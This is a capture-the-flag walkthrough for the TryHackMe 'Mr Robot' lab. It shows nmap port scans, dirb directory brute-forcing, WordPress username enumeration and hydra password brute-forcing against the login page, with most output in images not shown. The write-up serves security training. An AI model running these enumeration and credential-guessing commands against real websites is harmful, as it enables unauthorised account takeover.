# Mr Robot CTF

**Room Link:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)





## Scanning

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### HTTP port 80

**Kali**

```
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
```





<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

#### Key 1

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Downloaded fsocity.dic**

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

If you refresh the page you'll go to a wordpress site.

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Test to see what users exist in wordpress, if the user doesn't exist it will give an error saying the user is invalid.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -L fsocity.dic -p test  $VICTIM http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10
.10.70.148%2Fwp-admin%2F&testcookie=1:Invalid username" -V -t 30    
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Because there were so many entries in fsocity.dic I tried to reduce it as much as I could by removing duplicates and passwords that I thought would be unlikely.

**Kali**

```
cat fsocity.dic | sort | uniq > new-fsocity.dic
#Remove lines with less than 4 characters
sed -r '/^.{,4}$/d' new-fsocity.dic > new-new-fsocity.dic
#Remove lines with just numbers
awk '! /^[0-9]+$/' new-new-fsocity.dic > nonums.dic 
#Remove lines with more than 11 characters
sed '/^.\{11\}./d' nonums.dic > final.txt
```



**Kali**

```
hydra -L Elliot -P fsocity.dic  $VICTIM http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F
10.10.70.148%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
